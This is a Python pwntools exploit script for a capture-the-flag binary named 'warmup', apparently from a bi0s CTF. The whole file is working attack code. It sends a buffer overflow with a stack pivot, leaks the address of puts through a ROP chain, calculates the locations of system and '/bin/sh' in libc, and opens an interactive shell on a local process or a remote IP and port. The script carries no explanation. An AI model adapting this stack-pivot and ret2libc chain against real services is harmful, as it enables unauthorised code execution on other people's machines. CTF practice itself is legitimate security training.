from pwn import *

ropchain = 0x601040+0x100
read_main = 0x40066b #0x4005cd
leave_ret = 0x400695 #0x4005f7
puts_got = 0x601018
puts_plt = 0x4004e0 #0x400470
pop_rdi = 0x400703 #0x400663
pop_rbp = 0x4005e8 #0x400520
pop_rsi_r15 = 0x400701 # 0x400661
main = 0x400636 #0x4005b6

def exploit():
    p.recvuntil('Welcome to bi0s CTF!\n')
    payload = 'A'*112
    payload += p64(ropchain)
    payload += p64(read_main)
    p.send(payload)

    p.recvuntil('Welcome to bi0s CTF!\n')

    payload = p64(pop_rdi)
    payload += p64(puts_got)
    payload += p64(puts_plt)
    payload += p64(pop_rbp)
    payload += p64(ropchain+0x300)
    payload += p64(read_main)
    payload += 'A'*(80-8-8)
    payload += p64(0x6010c8) + p64(leave_ret)
    p.send(payload)

    #payload = fit({0:payload}, length=112, filler='A') + p64(ropchain-8) + p64(leave_ret)

    leak = p.recv(6)
    leak = leak + '\x00'*2
    leak = u64(leak)
    #print hex(leak)

    system = leak - 172800
    binsh = leak + 1169031

    p.recvuntil('Welcome to bi0s CTF!\n')

    payload = p64(pop_rdi)
    payload += p64(binsh)
    payload += p64(pop_rsi_r15)
    payload += p64(0)*2
    payload += p64(system)
    payload += 'A'*64
    payload += p64(0x6010c8+0x300) + p64(leave_ret)
    p.send(payload)

    p.interactive()

if __name__ == '__main__':

	if sys.argv[1] == 'local':
		p = process('./warmup')
	else:
		p = remote('35.196.102.230', 4444)

	exploit()
